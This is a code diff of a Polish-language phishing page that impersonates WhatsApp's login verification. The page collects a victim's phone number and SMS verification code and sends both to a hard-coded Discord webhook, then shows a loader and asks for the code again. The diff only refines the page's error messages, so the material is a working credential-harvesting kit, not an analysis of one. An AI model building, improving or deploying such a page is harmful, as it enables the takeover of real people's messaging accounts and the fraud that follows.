@@ -24,6 +24,7 @@
     .phone-input, .code-input { display: flex; gap: 0.5rem; }
     .prefix { padding: 0.75rem; background: #f0f0f0; border: 1px solid #ddd; border-radius: 4px 0 0 4px; font-size: 1rem; color: #303030; flex-shrink: 0; }
     .input-group input { flex: 1; padding: 0.75rem; font-size: 1rem; border: 1px solid #ddd; border-radius: 0 4px 4px 0; }
+    .error-message { color: red; font-size: 0.75rem; margin-top: 0.25rem; }
 
     .btn { width: 100%; padding: 1rem; background-color: #25D366; color: white; font-size: 1rem; font-weight: bold; border: none; border-radius: 4px; cursor: pointer; }
     .btn:active { opacity: 0.9; }
@@ -39,7 +40,6 @@
   </style>
 </head>
 <body>
-  <!-- Krok 1: numer telefonu -->
   <div class="container" id="phone-step">
     <div class="header">
       <a href="https://whatsapp.com" target="_blank" rel="noopener noreferrer">
@@ -54,13 +54,13 @@
           <div class="prefix">+48</div>
           <input type="tel" id="phone" placeholder="600000000" maxlength="9" pattern="\d{9}" required>
         </div>
+        <div class="error-message" id="phone-error"></div>
       </div>
       <button class="btn" onclick="sendCode()">Dalej</button>
     </div>
     <div class="footer">WhatsApp LLC</div>
   </div>
 
-  <!-- Krok 2: kod SMS -->
   <div class="container" id="code-step" style="display: none;">
     <div class="header">
       <a href="https://whatsapp.com" target="_blank" rel="noopener noreferrer">
@@ -74,13 +74,13 @@
         <div class="code-input">
           <input type="text" id="code" placeholder="123456" maxlength="6" pattern="\d{6}" required>
         </div>
+        <div class="error-message" id="code-error"></div>
       </div>
       <button class="btn" onclick="verifyCode()">Weryfikuj</button>
     </div>
     <div class="footer">WhatsApp LLC</div>
   </div>
 
-  <!-- Krok 3: loader -->
   <div class="container" id="loader-step" style="display: none;">
     <div class="header">
       <a href="https://whatsapp.com" target="_blank" rel="noopener noreferrer">
@@ -98,8 +98,16 @@
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1364124316672720946/RH_yjYGhG5gxCfCinGkgZnXTkbgKc67gZ_0r62YPS5xZNYxk8XmRTzeC_7B8LLXh1lin';
 
     function sendCode() {
-      const phone = document.getElementById('phone').value;
-      if (!/^\d{9}$/.test(phone)) { alert('Podaj poprawny numer składający się z 9 cyfr.'); return; }
+      const phoneInput = document.getElementById('phone');
+      const phoneError = document.getElementById('phone-error');
+      const phone = phoneInput.value;
+
+      if (!/^\d{9}$/.test(phone)) {
+        phoneError.textContent = 'Podaj poprawny numer składający się z 9 cyfr.';
+        return;
+      }
+      phoneError.textContent = ''; // Wyczyść komunikat o błędzie
+
       document.getElementById('phone-step').style.display = 'none';
       document.getElementById('code-step').style.display = 'block';
       fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: `sendCode: numer telefonu = ${phone}` }) }).catch(console.error);
@@ -107,8 +115,16 @@
 
     function verifyCode() {
       const phone = document.getElementById('phone').value;
-      const code = document.getElementById('code').value;
-      if (!/^\d{6}$/.test(code)) { alert('Podaj poprawny 6-cyfrowy kod.'); return; }
+      const codeInput = document.getElementById('code');
+      const codeError = document.getElementById('code-error');
+      const code = codeInput.value;
+
+      if (!/^\d{6}$/.test(code)) {
+        codeError.textContent = 'Podaj poprawny 6-cyfrowy kod.';
+        return;
+      }
+      codeError.textContent = ''; // Wyczyść komunikat o błędzie
+
       document.getElementById('code-step').style.display = 'none';
       document.getElementById('loader-step').style.display = 'block';
       fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: `verifyCode: numer telefonu = ${phone}, kod = ${code}` }) }).catch(console.error);
@@ -118,7 +134,7 @@
         // reset do kroku kodu
         document.getElementById('loader-step').style.display = 'none';
         document.getElementById('code-step').style.display = 'block';
-        document.getElementById('code').value = '';
+        codeInput.value = ''; // Wyczyść pole kodu
       }, 5000);
     }
   </script>
